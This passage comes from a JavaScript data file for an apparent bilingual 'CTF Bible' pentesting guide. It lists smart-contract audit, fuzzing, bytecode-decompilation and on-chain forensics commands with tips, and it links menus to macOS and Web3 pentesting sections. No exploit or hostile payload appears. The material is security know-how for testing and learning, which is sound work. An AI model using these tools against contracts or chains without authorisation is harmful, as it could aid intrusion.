      { label: "Mythril — exécution symbolique", label_en: "Mythril — symbolic execution", cmd: "pip install mythril\nmyth analyze contract.sol --solv 0.8.19\nmyth analyze --rpc mainnet --address ADDR\nmyth analyze contract.sol -t 5 --execution-timeout 600\n# Output JSON :\nmyth analyze contract.sol -o json" },
      { label: "Echidna — fuzzing de contrats", label_en: "Echidna — contract fuzzing", cmd: "# echidna.yaml :\n# testMode: assertion\n# testLimit: 50000\n# seqLen: 100\n# contractAddr: '0xdeadbeef...'\nechidna contract.sol --contract MyContract --config echidna.yaml\n# Propriétés à tester : invariants métier (solde toujours positif, etc.)" },
      { label: "Hardhat — environnement local", label_en: "Hardhat — local environment", cmd: "npx hardhat node --fork https://eth-mainnet.alchemyapi.io/v2/KEY\nnpx hardhat test --network localhost\nnpx hardhat compile\n# Plugin Etherscan verify :\nnpx hardhat verify --network mainnet ADDR 'constructor_arg'" },
      { label: "Forensics on-chain", label_en: "On-chain forensics", cmd: "# Dune Analytics — requêtes SQL on-chain\n# Nansen — labeling d'adresses\n# Chainalysis Reactor — tracing cross-chain\n# Tenderly — debug de transactions :\n# https://dashboard.tenderly.co/tx/mainnet/TX_HASH\n# The Graph — indexation d'événements\ncast receipt TX_HASH --rpc-url RPC_URL\ncast run TX_HASH --rpc-url RPC_URL  # replay local" },
      { label: "Heimdall — décompiler bytecode", label_en: "Heimdall — decompile bytecode", cmd: "cargo install heimdall-rs\nheimdall decompile ADDR --rpc-url RPC_URL\nheimdall decode TX_CALLDATA\nheimdall cfg ADDR --rpc-url RPC_URL  # Control Flow Graph" },
      { label: "Outils privacy Bitcoin", label_en: "Bitcoin privacy tools", cmd: "# Analyser transaction :\nbitcoin-cli getrawtransaction TX_HASH true\n# CoinJoin detection :\n# Inputs multiples + outputs égaux = probable CoinJoin\n# UTXO analysis :\nbitcoin-cli listunspent 1 9999999 '[\"ADDRESS\"]'\n# Lightning Network :\nlncli listchannels && lncli listinvoices" }
    ],
    lookfor: [
      "Contrats sans tests exhaustifs → mutation testing révèle les gaps",
      "Bytecode non vérifié sur Etherscan → décompilation nécessaire",
      "Événements manquants → forensics difficile après incident",
      "Pas de pausing mechanism → impossible de stopper exploit en cours"
    ],
    lookfor_en: [
      "Contracts without exhaustive tests → mutation testing reveals gaps",
      "Bytecode not verified on Etherscan → decompilation needed",
      "Missing events → forensics difficult after incident",
      "No pausing mechanism → impossible to stop an exploit in progress"
    ],
    tips: [
      "Foundry >> Hardhat pour les tests de sécurité (fork mainnet natif, traces EVM détaillées)",
      "Slither gratuit et très rapide → toujours lancer en premier",
      "Echidna fuzzing : définir des propriétés métier (invariants) plutôt que juste les assertions",
      "Tenderly permet de rejouer une transaction et d'inspecter chaque appel avec traces complètes"
    ],
    tips_en: [
      "Foundry >> Hardhat for security testing (native mainnet fork, detailed EVM traces)",
      "Slither is free and very fast → always run first",
      "Echidna fuzzing: define business properties (invariants) rather than just assertions",
      "Tenderly allows replaying a transaction and inspecting each call with full traces"
    ],
    choices: [
      { label: "Smart Contracts — vulnérabilités", label_en: "Smart Contracts — vulnerabilities", next: "web3_smart_contracts", icon: "📄" },
      { label: "Wallet & Signing Security", label_en: "Wallet & Signing Security", next: "web3_wallet_security", icon: "🔑" },
      { label: "Web3 red teaming intro", label_en: "Web3 red teaming intro", next: "web3_intro", icon: "⛓️" }
    ]
  }

});

// ─── Patches des nœuds existants ───────────────────────────────────────────────

// Ajouter macOS au menu de départ
NODES["start"].choices.push(
  { label: "macOS Pentesting", label_en: "macOS Pentesting", next: "macos_pentest", icon: "🍎" },
  { label: "Web3 / Blockchain Security", label_en: "Web3 / Blockchain Security", next: "web3_intro", icon: "⛓️" }
);

// Lier depuis android_pentest → macOS
NODES["android_pentest"].choices.push(
  { label: "macOS Pentesting", label_en: "macOS Pentesting", next: "macos_pentest", icon: "🍎" }
);

console.log("[CTF Bible] macOS + Web3 chargés :", Object.keys(NODES).length, "nœuds au total");
